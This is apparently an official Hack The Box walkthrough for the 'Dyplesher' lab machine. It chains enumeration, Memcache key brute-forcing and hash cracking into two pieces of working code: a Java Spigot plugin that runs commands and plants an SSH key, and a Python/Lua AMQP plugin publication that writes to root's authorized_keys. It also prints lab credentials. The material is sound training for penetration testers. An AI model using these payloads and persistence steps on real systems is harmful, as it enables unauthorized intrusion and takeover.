@@ -1,0 +1,435 @@
+Dyplesher
+
+17th October 2020 / Document No D20.100.94
+Prepared By: MrR3boot
+Machine Author(s): felamos & yuntao
+Difficulty: Insane
+Classification: Official
+Synopsis
+
+Dyplesher is an insane difficulty Linux machine featuring multiple technologies and
+vulnerabilities. Vhost enumeration reveals a Git repository containing source code, in which we
+find credentials. These credentials are used to enumerate the Memcache service and obtain
+further credentials. These are in turn used to gain access to a Gogs server which has multiple
+private repositories. Enumeration of release files in one repository reveals another set of
+credentials that are used to access a Minecraft server application. A foothold can be gained by
+uploading a Minecraft plugin. Credentials found in a network capture can be used to escalate to
+another user. Publishing a Cuberite plugin over the AMQP protocol leads to a root shell.
+
+Skills Required
+
+      Web Enumeration
+      Programming
+      Scripting
+
+Skills Learned
+
+      Password Cracking
+      Minecraft Plugin Creation
+      AMQP
+      Cuberite
+Enumeration
+
+Nmap
+
+ports=$(nmap -p- --min-rate=1000 -T4  10.10.10.190 | grep ^[0-9] | cut -d '/' -f
+1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV 10.10.10.190
+
+Nmap output reveals that the target server has ports 22 (OpenSSH), 80 (Apache), 3000 (ppp?),
+4369 (Erlang Port Mapper), 5672 (RabbitMQ), 11211 (Memcache) and 25565 (Minecraft) open.
+
+Apache
+
+The application hosted on Apache refers to a Minecraft Server and displays its status and
+hostname.
+
+Let's add the hostnames to the /etc/hosts file.
+   10.10.10.190 dyplesher.htb test.dyplesher.htb
+The STAFF page reveals 3 different usernames.
+
+Each profile has a gear icon underneath it. Download this image, and click on the camera icon in
+the Google images search field to bring up the "Search by image" box. Upload the gear image and
+search for it.
+
+This reveals that it is a logo used by the Gogs application. Further googling reveals that the
+default port for this application is 3000.
+Gogs
+
+Let's browse to port 3000.
+
+A registration feature is available. We can register and login as a test user.
+The service also reveals the version number in the footer, which doesn't have any publicly known
+vulnerabilities at the time of writing.
+Clicking on the Explore tab we find the active users. Let's note the email IDs for the future use.
+
+Previous enumeration reveals the vhost test.dyplesher.htb . Let's access that.
+
+The page just takes two parameters and returns a 200 response code if the values are equal, or
+a 500 Internal Server Error is returned if they are different. At this stage we are not sure
+that if the application is really adding the key-value pair to the Memcache database. Let's add a
+sample key-value pair.
+
+Using memcache tools we can enumerate the keys that are stored in the Memcache database.
+Run the below command to install the Memcache utilities.
+
+   apt-get install libmemcached-tools
+We can now use memccat to view the key values.
+   memccat --servers=10.10.10.190 a
+
+This was unsuccessful. It could be possible that target Memcache instance is using the Simple
+Authentication and Security Layer (SASL) framework to provide authentication and
+authorization.
+
+FFUF
+
+Let's enumerate the main host using ffuf.
+   ffuf -u http://10.10.10.190/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+The output reveals that /home , /login and /register pages are available. Browsing to the
+/register endpoint redirects to the /login page.
+We can try to bruteforce the login page and can also attempt SQL injection. However, both
+attempts resulted in failure. Let's continue our enumeration on other host test.dyplesher.htb .
+
+This reveals a Git repository. Using git-dumper, we can download the repository to our local
+machine.
+Memcache
+
+There's a single PHP file in the repository.
+
+   <HTML>
+   <BODY>
+   <h1>Add key and value to memcache<h1>
+   <FORM METHOD="GET" NAME="test" ACTION="">
+   <INPUT TYPE="text" NAME="add">
+   <INPUT TYPE="text" NAME="val">
+   <INPUT TYPE="submit" VALUE="Send">
+   </FORM>
+   <pre>
+   <?php
+   if($_GET['add'] != $_GET['val']){
+
+                 $m = new Memcached();
+                 $m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
+                 $m->setSaslAuthData("felamos", "zxcvbnm");
+                 $m->addServer('127.0.0.1', 11211);
+                 $m->add($_GET['add'], $_GET['val']);
+                 echo "Done!";
+   }
+   else {
+                 echo "its equal";
+   }
+   ?>
+   </pre>
+   </BODY>
+   </HTML>
+This file is responsible for adding the key-value pair to the Memcached database. It also reveals a
+set of credentials which are authorized to access the Memcache service.
+We can try to bruteforce the keys using known wordlists or maybe guess using common values
+such as username, password etc.
+
+   #!/bin/bash
+   f='/usr/share/wordlists/rockyou.txt'
+   while IFS= read -r line
+   do
+
+                 memccat --servers=10.10.10.190 --username felamos --password zxcvbnm
+   $line 2>/dev/null >/dev/null
+
+                 if [[ $? -ne 1 ]];then
+                                echo "[+] Key : $line"
+
+                 fi
+   done < "$f"
+The script takes each line from the wordlist as a key name, and attempts to view its values using
+the memccat tool. If a valid result is found then it prints the key name.
+
+It found 3 valid keys. Let's enumerate the values for them.
+   memccat --servers=10.10.10.190 --username felamos --password zxcvbnm username
+   password email
+
+We have now the usernames, emails and password hashes. Save the usernames and hashes to a
+file.
+
+   minato:$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
+   felamos:$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
+   yuntao:$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
+Using John The Ripper or hashcat we can try to crack the hashes.
+   john hashes --wordlist=/usr/share/wordlists/rockyou.txt
+
+The hash for the felamos user was successfully cracked. We can try these credentials on main
+domain login page. However, this didn't work. Let's try them on Gogs server instead.
+
+This is successful and we see two repositories: gitlab and memcached . The gitlab repo
+contains a release.
+
+The Source Code release file just contains a README.md . repo.zip looks interesting. Let's
+download and unzip that.
+It contains a repositories folder which has several bundle files.
+
+The folder structure resembles the following.
+   repository (4b)
+          |____branch (22/master)
+                                |_____files (bundle)
+
+There are 4 different repositories. Running the file command on a bundle file reveals that it's a
+Git bundle.
+
+Git is capable of bundling its data into a single file. These bundle files are an archive of
+repositories that we generally upload to Git using git push . We can unbundle these files to get
+the repositories back using the command git clone .
+
+   git clone
+   4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
+As the main domain refers to a Minecraft Server , we can look for a repository containing this.
+The 4e repository has many files. It is very common for developers to accidentally commit keys
+or passwords in Git repositories. A search on the string password returns the following results.
+
+The password walrus doesn't work on login page. The users.db file is a SQLite database. Let's
+view the information it contains.
+
+We can try to crack this hash using John The Ripper or Hashcat.
+Foothold
+
+This is successful. We can now try to login to dyplesher.htb/login with this password and the
+three usernames found from earlier enumeration. The login is successful using the credentials
+felamos / alexis1 .
+
+The application offers functionality to manage the Minecraft instance.
+
+It's using Paper MC, which is a high performance fork of the Spigot Minecraft Server that is
+extensible using Spigot plugins. Under Delete Plugin tab we can see list of plugins on the
+server.
+Researching online reveals that it is possible to execute system commands using Spigot plugins.
+We can try building a new plugin and upload it to the server. The server uses a PlugMan plugin
+that allows server administrators to manage plugins without restarting the server every time. For
+reference, we download the PlugMan plugin source code from Github. To open the project we
+first need to install IntelliJ IDEA or the Eclipse IDE in Windows. This can also be done through
+maven on Linux platforms.
+Start the IntelliJ IDE and import the PlugMan project. The project structure should look like the
+following.
+
+After removing the unnecessary files and folders, we are left with the following structure.
+The plugin.yml file should be updated as below.
+
+   name: exploit
+   main: com.rylinaux.plugman.exploit
+   version: 2.1.7
+   description: Plugin manager for Bukkit servers
+   author: rylinaux
+
+We can now modify the file exploit.java to display a success message on plugin enablement.
+
+   package com.rylinaux.plugman;
+
+   import org.bukkit.plugin.java.JavaPlugin;
+
+   public class exploit extends JavaPlugin {
+          @Override
+          public void onEnable(){
+                 System.out.println("Success");
+          }
+
+          @Override
+          public void onDisable(){
+
+                 System.out.print("Disabled");
+          }
+   }
+
+Next, we can proceed to build the artifact by navigating to Build > Build Artifacts > Build .
+The exploit.jar file gets created in the out > artifacts folder.
+We can then upload the file on Add Plugin page.
+
+The uploaded plugin can be seen on the Delete Plugins page.
+
+We can load the plugin by navigating to the Reload Plugin page and inputting the name
+exploit in the input box without .jar extension.
+
+The logs can be seen on the Console page.
+
+The output confirms that our plugin has been successfully loaded by PlugMan . Let's modify the
+plugin to execute system commands.
+
+   package com.rylinaux.plugman;
+   import org.bukkit.plugin.java.JavaPlugin;
+   import java.io.BufferedReader;
+   import java.io.IOException;
+   import java.io.InputStreamReader;
+   public class exploit extends JavaPlugin {
+          @Override
+          public void onEnable(){
+
+                 System.out.println("Enabled");
+                 ProcessBuilder processBuilder = new ProcessBuilder();
+                 processBuilder.command("/usr/bin/cat", "/etc/passwd");
+                 try {
+
+                     Process process = processBuilder.start();
+                     BufferedReader reader = new BufferedReader(new
+   InputStreamReader(process.getInputStream()));
+
+                         String line;
+                         while ((line = reader.readLine()) != null) {
+
+                                System.out.println(line);
+                         }
+                         int exitCode = process.waitFor();
+                         System.out.println("\nExited with error code : " + exitCode);
+                 } catch (IOException e) {
+                         e.printStackTrace();
+                 } catch (InterruptedException e) {
+                         e.printStackTrace();
+                 }
+                 }
+          @Override
+          public void onDisable(){
+                 System.out.println("Disabled");
+          }
+   }
+
+The above code uses the ProcessBuilder class to execute /bin/cat to read /etc/passwd .
+Using the BufferedReader class we can create a character input stream to print the command
+output line by line to the Minecraft console.
+Let's rebuild the plugin and upload it to the server.
+
+This is successful and we can see a list of system users. We can check the process owner by
+changing the command to id .
+   ...
+   public void onEnable(){
+
+                 System.out.println("Enabled");
+                 ProcessBuilder processBuilder = new ProcessBuilder();
+                 processBuilder.command("id");
+   ...
+This shows that the process is running as MinatoTW .
+
+Attempts at getting a reverse shell fail. This could be due to the presence of the firewall. Instead,
+we can try to write our public key to /home/MinatoTW/.ssh/authorized_keys and login over
+SSH. Enumeration of the MinatoTW home folder reveals that a .ssh subfolder already exists.
+
+The exploit.java file can be modified to write our public key to the authorized_keys file.
+   package com.rylinaux.plugman;
+   import org.bukkit.plugin.java.JavaPlugin;
+   import java.io.IOException;
+   import java.io.FileWriter;
+   public class exploit extends JavaPlugin {
+          @Override
+          public void onEnable(){
+                 System.out.println("Enabled");
+                 try {
+                         FileWriter myWriter = new
+   FileWriter("/home/MinatoTW/.ssh/authorized_keys");
+                         myWriter.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQA<SNIP>");
+                         myWriter.close();
+                         System.out.println("Successfully wrote to the file.");
+                 } catch (IOException e) {
+                         System.out.println("An error occurred.");
+                         e.printStackTrace();
+                 }
+          }
+          @Override
+          public void onDisable(){
+                 System.out.println("Disabled");
+          }
+   }
+The code uses the FileWriter class to write the public key. Rebuild the plugin and re-upload it
+to the server.
+
+This is successful. We can now login using SSH as MinatoTW .
+
+There are other users present on the server. We don't have access to the felamos or git
+directories.
+Lateral Movement
+
+It's seen that MinatoTW is part of wireshark group. We can also enumerate running processes
+using pspy. Let's transfer pspy to the server using SCP.
+
+   scp pspy32s MinatoTW@10.10.10.190:/home/MinatoTW
+
+From the output, it can be seen that root is starting a service called amqp-com every minute.
+
+The rabbitmq service is also being run at regular intervals. RabbitMQ is a general purpose
+message broker that supports several protocols such as AMQP, MQTT and more. AMQP stands
+for Advanced Message Queuing Protocol. Message queuing is a style of service-to-service
+communication. It allows applications to communicate by sending messages to each other.
+RabbitMQ delivers messages to multiple consumers. A consumer is a user application that
+receives messages by subscribing to a particular topic on the message broker.
+Checking files owned by the wireshark group, we can see a single file.
+
+The dumpcap utility can be used to capture live network traffic. With the obtained information,
+we can imagine that there might be some communication taking place between the RabbitMQ
+broker and the host, using AMQP protocol (over TCP). Wireshark's command-line utility tshark is
+also present on the server.
+We can start capturing the packets using either tshark or dumpcap on port 5672 .
+
+   tshark -i any -w /tmp/capture.pcap "port 5672"
+After a little while, we can stop the process and transfer the capture file to our machine for
+further analysis.
+
+   scp MinatoTW@10.10.10.190:/tmp/capture.pcap .
+The capture file can be opened in Wireshark.
+
+Right-clicking on the AMQP protocol packet and following the TCP stream reveals information on
+subscribers.
+
+This information includes emails and passwords. Using the felamos password we can switch to
+that user.
+Privilege Escalation
+
+We see a folder called yuntao in the felamos home folder, which contains the bash script
+send.sh .
+
+The script just echoes a message to a named pipe {} in the pseudo-ttys (/dev/pts) folder, which
+does nothing. The message says that yuntao can publish any player-created cuberite plugins.
+In AMQP, messages are published to exchanges , which are often compared to post offices or
+mailboxes. Exchanges then distribute message copies to queues using rules called bindings .
+Then the broker either deliver messages to consumers that are subscribed to queues, or
+consumers fetch/pull messages from queues on demand.
+In our case the consumer is cuberite, which is a Minecraft server implementation and a easy-to-
+use plugin system that allows users to write custom plugins with Lua.
+
+During process enumeration it's found that root is running a lua script from the
+/root/work/data directory every minute.
+
+From network traffic capture we have the AMQP credentials for yuntao .
+We need to create our own plugin in Lua and publish it as a URL using the AMQP protocol.
+test.lua
+
+   local file=io.open("/dev/shm/test.txt","wb+");
+   file:write("hi");
+   io.close(file);
+
+The above Lua script creates a file in /dev/shm . We can use the pika Python module to interact
+with AMQP.
+publish.py
+
+   import pika
+   credentials = pika.PlainCredentials('yuntao','EashAnicOc3Op');
+   parameters = pika.ConnectionParameters('10.10.10.190',5672,'/',credentials)
+   connection = pika.BlockingConnection(parameters)
+   channel = connection.channel()
+   channel.basic_publish(exchange='plugin_data', routing_key='',
+   body='http://127.0.0.1:8000/test.lua')
+   connection.close()
+
+The above Python script uses yuntao's credentials to authenticate to the RabbitMQ broker and
+then publishes the plugin URL to the plugin_data exchange. As outbound connections are
+blocked either we have to place the plugin in /var/www/html (writable by MinatoTW ) or use SSH
+remote port forwarding to let the broker access the plugin from our machine.
+
+   ssh -R 8000:127.0.0.1:8000 MinatoTW@10.10.10.190
+
+Stand up a listener on port 8000 and run the publish.py script locally.
+
+This is successful, and the test.txt file is created on the server in the context of root.
+We can now rename test.lua to a new name (updating the Python script accordingly) and
+modify the Lua script to write our public key to /root/.ssh/authorized_keys .
+
+   local file=io.open("/root/.ssh/authorized_keys","wb+");
+   file:write("ssh-rsa
+   AAAAB3NzaC1yc2EAAAADAQABAAABgQCu73ySj2MIyShGFESCN0aRWek4nHG/C9<SNIP>");
+   io.close(file);
+
+After running publish.py again, we can login to the server as root using SSH.
+
